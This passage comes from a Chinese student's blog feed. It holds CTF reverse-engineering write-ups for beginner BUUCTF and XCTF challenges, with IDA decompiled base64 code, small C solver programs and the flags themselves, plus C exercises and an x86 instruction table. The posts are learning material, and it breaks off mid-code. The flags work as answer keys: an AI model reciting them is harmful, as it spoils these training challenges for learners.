        <content type="html"><![CDATA[<h1 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h1><a id="more"></a><ol><li>学习了while、for、do while循环</li><li>学习了&gt;、&gt;=、!=、==、+=等运算符</li></ol><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write_up"></a>Write_up</h1><h2 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h2><p><a href="https://buuoj.cn/challenges#easyre">题目链接</a><br>查看文件信息</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/easyre_1.PNG"></p><p>IDA打开搜索字符串即找到flag</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/easyre_2.PNG"></p><h2 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h2><p><a href="https://buuoj.cn/challenges#reverse1">题目链接</a><br>查看文件信息</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/reverse1_1.PNG"></p><p>IDA打开查看字符串</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/reverse1_2.PNG"></p><p>由 this is the right flag 转到主要函数</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/reverse1_4.PNG"></p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/reverse1_3.PNG"></p><p>flag为{hell0_w0rld}</p><h2 id="reverse3"><a href="#reverse3" class="headerlink" title="reverse3"></a>reverse3</h2><p><a href="https://buuoj.cn/challenges#reverse3">题目链接</a><br>查看文件信息</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/reverse3_1.PNG"></p><p>ida32打开查看main函数</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/reverse3_2.PNG"></p><p>sub_4110BE经过跳转为下方函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *__cdecl <span class="title">sub_411AB0</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, <span class="keyword">int</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// STE0_4</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// STE0_4</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// STE0_4</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+D4h] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+E0h] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// [esp+ECh] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+ECh] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v11; <span class="comment">// [esp+ECh] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">void</span> *Dst; <span class="comment">// [esp+F8h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> *v13; <span class="comment">// [esp+104h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 || !a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v9 = a2 / <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)(a2 / <span class="number">3</span>) % <span class="number">3</span> )</span><br><span class="line">    ++v9;</span><br><span class="line">  v10 = <span class="number">4</span> * v9;</span><br><span class="line">  *a3 = v10;</span><br><span class="line">  Dst = <span class="built_in">malloc</span>(v10 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !Dst )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  j_memset(Dst, <span class="number">0</span>, v10 + <span class="number">1</span>);</span><br><span class="line">  v13 = a1;</span><br><span class="line">  v11 = a2;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v11 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_41A144[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    byte_41A144[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    byte_41A144[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">3</span> &amp;&amp; v11 &gt;= <span class="number">1</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      byte_41A144[i] = *v13;</span><br><span class="line">      --v11;</span><br><span class="line">      ++v13;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !i )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        *((_BYTE *)Dst + v7) = aAbcdefghijklmn[(<span class="keyword">signed</span> <span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)byte_41A144[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">        v4 = v7 + <span class="number">1</span>;</span><br><span class="line">        *((_BYTE *)Dst + v4++) = aAbcdefghijklmn[((byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>) | </span><br><span class="line">         <span class="number">16</span> * (byte_41A144[<span class="number">0</span>] &amp; <span class="number">3</span>)];</span><br><span class="line">        *((_BYTE *)Dst + v4++) = aAbcdefghijklmn[<span class="number">64</span>];</span><br><span class="line">        *((_BYTE *)Dst + v4) = aAbcdefghijklmn[<span class="number">64</span>];</span><br><span class="line">        v7 = v4 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        *((_BYTE *)Dst + v7) = aAbcdefghijklmn[(<span class="keyword">signed</span> <span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)byte_41A144[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">        v5 = v7 + <span class="number">1</span>;</span><br><span class="line">        *((_BYTE *)Dst + v5++) = aAbcdefghijklmn[((byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>) |</span><br><span class="line">        <span class="number">16</span> * (byte_41A144[<span class="number">0</span>] &amp; <span class="number">3</span>)];</span><br><span class="line">        *((_BYTE *)Dst + v5++) = aAbcdefghijklmn[((byte_41A144[<span class="number">2</span>] &amp; <span class="number">0xC0</span>) &gt;&gt; <span class="number">6</span>) |</span><br><span class="line">        <span class="number">4</span> * (byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF</span>)];</span><br><span class="line">        *((_BYTE *)Dst + v5) = aAbcdefghijklmn[<span class="number">64</span>];</span><br><span class="line">        v7 = v5 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        *((_BYTE *)Dst + v7) = aAbcdefghijklmn[(<span class="keyword">signed</span> <span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)byte_41A144[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">        v6 = v7 + <span class="number">1</span>;</span><br><span class="line">        *((_BYTE *)Dst + v6++) = aAbcdefghijklmn[((byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>) |</span><br><span class="line">        <span class="number">16</span> * (byte_41A144[<span class="number">0</span>] &amp; <span class="number">3</span>)];</span><br><span class="line">        *((_BYTE *)Dst + v6++) = aAbcdefghijklmn[((byte_41A144[<span class="number">2</span>] &amp; <span class="number">0xC0</span>) &gt;&gt; <span class="number">6</span>) |</span><br><span class="line">        <span class="number">4</span> * (byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF</span>)];</span><br><span class="line">        *((_BYTE *)Dst + v6) = aAbcdefghijklmn[byte_41A144[<span class="number">2</span>] &amp; <span class="number">0x3F</span>];</span><br><span class="line">        v7 = v6 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *((_BYTE *)Dst + v7) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> Dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/reverse3_3.PNG"></p><p>应该是将str进行base64加密</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/reverse3_4.PNG"></p><p>将整个程序还原一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> Dest[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> Str2[] = <span class="string">&quot;e3nifIH9b_C@n@dH&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> i, v8;</span><br><span class="line">v8 = <span class="built_in">strlen</span>(Str2);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8; i++ )</span><br><span class="line">&#123;</span><br><span class="line">Dest[i] = Str2[i] - i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, Dest[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出为e2lfbDB2ZV95b3V9<br>base64解码为{i_l0ve_you}</p><h2 id="GKCTF2020-Check-1n"><a href="#GKCTF2020-Check-1n" class="headerlink" title="[GKCTF2020]Check_1n"></a>[GKCTF2020]Check_1n</h2><p><a href="https://buuoj.cn/challenges#reverse3">题目链接</a><br>查看文件信息</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%5BGKCTF2020%5DCheck_1n_1.PNG"></p><p>打开程序提示输入密码，随意输个提示密码错误<br>在ida中搜索’密码错误’</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%5BGKCTF2020%5DCheck_1n_2.PNG"></p><p>跳转至指定函数，找到’密码错误’所在位置</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%5BGKCTF2020%5DCheck_1n_3.PNG"></p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%5BGKCTF2020%5DCheck_1n_4.PNG"></p><p>密码为HelloWorld</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%5BGKCTF2020%5DCheck_1n_5.PNG"></p><p>选中flag，base64解码</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%5BGKCTF2020%5DCheck_1n_6.PNG"></p><p>根据提示打开’打砖块’, flag自动出现</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%5BGKCTF2020%5DCheck_1n_7.PNG"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>补充</title>
      <link href="/2020/11/29/%E8%A1%A5%E5%85%85/"/>
      <url>/2020/11/29/%E8%A1%A5%E5%85%85/</url>
      
        <content type="html"><![CDATA[<h1 id="背景正在优化中。"><a href="#背景正在优化中。" class="headerlink" title="背景正在优化中。"></a>背景正在优化中。</h1><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">default_cover: </span><br><span class="line">    - &#x2F;img&#x2F;1.jpg</span><br><span class="line">    - &#x2F;img&#x2F;2.jpg</span><br><span class="line">    - &#x2F;img&#x2F;3.jpg</span><br><span class="line">    - &#x2F;img&#x2F;4.png</span><br><span class="line">    - &#x2F;img&#x2F;5.jpg</span><br><span class="line">    - &#x2F;img&#x2F;6.jpg</span><br><span class="line">    - &#x2F;img&#x2F;7.png</span><br><span class="line">    - &#x2F;img&#x2F;8.png</span><br><span class="line">    - &#x2F;img&#x2F;9.png</span><br><span class="line">    - &#x2F;img&#x2F;10.png</span><br><span class="line">    - &#x2F;img&#x2F;11.png</span><br><span class="line">    - &#x2F;img&#x2F;12.png</span><br><span class="line">    - &#x2F;img&#x2F;13.png</span><br><span class="line">    - &#x2F;img&#x2F;14.png</span><br><span class="line">L1uis112240203</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂项 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编程练习1</title>
      <link href="/2020/11/29/%E8%8F%9C%E9%B8%A1%E7%9A%84%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
      <url>/2020/11/29/%E8%8F%9C%E9%B8%A1%E7%9A%84%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="C语言篇"><a href="#C语言篇" class="headerlink" title="C语言篇"></a>C语言篇</h1><a id="more"></a><h2 id="计算1-2-3-…-n"><a href="#计算1-2-3-…-n" class="headerlink" title="计算1+2+3+…+n"></a>计算1+2+3+…+n</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; //计算1+2+3+...+n </span></span></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> a, b, c, d;</span><br><span class="line">b = <span class="number">0</span>;</span><br><span class="line">c = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入1开始程序\n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;d) == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入n（为数字），输出结果为：1+2+3+...+n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line">    <span class="keyword">while</span> (b &lt;= a)</span><br><span class="line">        &#123;</span><br><span class="line">         c = b + c;</span><br><span class="line">         b++; </span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1+2+3+...+n = %d\n&quot;</span>, c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入q离开程序，或者输入1再次开始程序计算令一个1+2+3+...+n\n&quot;</span>);</span><br><span class="line">    b = <span class="number">0</span>;</span><br><span class="line">    c = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="计算n！"><a href="#计算n！" class="headerlink" title="计算n！"></a>计算n！</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; //计算n！ (不精确且最大为170)</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a, b, d;</span><br><span class="line"><span class="keyword">double</span> c;</span><br><span class="line">b = <span class="number">1</span>;</span><br><span class="line">c = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入1开始程序\n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;d) == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入n（为数字），输出结果为n！：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line">    <span class="keyword">while</span> (b &lt;= a)</span><br><span class="line">        &#123;</span><br><span class="line">        c = b * c;</span><br><span class="line">        b++; </span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;n! = %e\n&quot;</span>, c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入q离开程序，或者输入1再次开始程序计算令一个数的阶乘\n&quot;</span>);</span><br><span class="line">    b = <span class="number">1</span>;</span><br><span class="line">    c = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 编程练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++-编程练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一周学习与做题记录</title>
      <link href="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h1><a id="more"></a><h2 id="C语言篇"><a href="#C语言篇" class="headerlink" title="C语言篇"></a>C语言篇</h2><ol><li>学习了——strlen()函数</li><li>学习了关键字——const</li><li>学习了字符串</li><li>如何创建、储存字符串</li><li>如何用strlen()函数获取字符串长度</li><li>用C预处理器指令#define和ANSCI的const修饰创建符号常量</li></ol><h2 id="x86汇编篇"><a href="#x86汇编篇" class="headerlink" title="x86汇编篇"></a>x86汇编篇</h2><h3 id="常用x86汇编指令："><a href="#常用x86汇编指令：" class="headerlink" title="常用x86汇编指令："></a>常用x86汇编指令：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">MOV MOV EAX,ECX(将ECX的值存入EAX)</span><br><span class="line">ADD ADD EAX,ECX EAX+&#x3D;ECX(将EAX加上ECX的值)</span><br><span class="line">SUB SUB EAX,ECX EAX-&#x3D;ECX(将EAX减去ECX的值)</span><br><span class="line">INC INC EAX EAX++ (将EAX的值加1)</span><br><span class="line">DEC DEC EAX EAX-- (将EAX的值减1)</span><br><span class="line">LEA LEA EAX,[ECX+4] (将ECX+4的值存入EAX)</span><br><span class="line">CMP CMP EAX ECX if(EAX&#x3D;&#x3D;ECX) ZF&#x3D;1 else ZF&#x3D;0 (将两个值比较并根据结果设置0标志位ZF)</span><br><span class="line">TEST TEST EAX EAX if(eax&#x3D;&#x3D;0) ZF&#x3D;1 else ZF&#x3D;0 (将值与0比较并根据结果设置0标志位ZF)</span><br><span class="line">JE(JZ) JE 04001000 if(ZF&#x3D;&#x3D;1) GOTO 04001000 (若ZF为1，则跳转道04001000)</span><br><span class="line">JNE(JNZ) JNE 04001000 if(ZF&#x3D;&#x3D;0) GOTO 04001000 (若ZF为0，则跳转道04001000)</span><br><span class="line">JMP JMP 04001000 GOTO 04001000 (无条件跳转道04001000)</span><br><span class="line">CALL CALL IstrcmpW (调用IstrcmpW)</span><br><span class="line">PUSH PUSH 00000001 (将00000001入栈)</span><br><span class="line">POP POP EAX (出栈并将获取的值存入EAX)</span><br></pre></td></tr></table></figure><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write_up"></a>Write_up</h1><h2 id="insanity"><a href="#insanity" class="headerlink" title="insanity"></a>insanity</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5079&page=1">题目链接</a><br>搜索字符串直接获取flag</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/insanity.PNG"></p><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5073&page=1">题目链接</a><br>ida打开，观察main函数伪代码</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/re1_1.png"></p><p>然后在16进制试图搜索flag</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/re1_2.png"></p><p>双击转到</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/re1_3.png"></p><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5074&page=1">题目链接</a><br>ida打开，查看main函数伪代码，在结尾跳转多次，发现</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/game_1.png"></p><p>还有一堆数字，以及一个for循环。</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/game_2.png"></p><p>此for循环运行结果即为flag。</p><p>还原一下程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">56</span>] = &#123;<span class="number">18</span>,<span class="number">64</span>,<span class="number">98</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">48</span>,<span class="number">49</span>,<span class="number">65</span>,<span 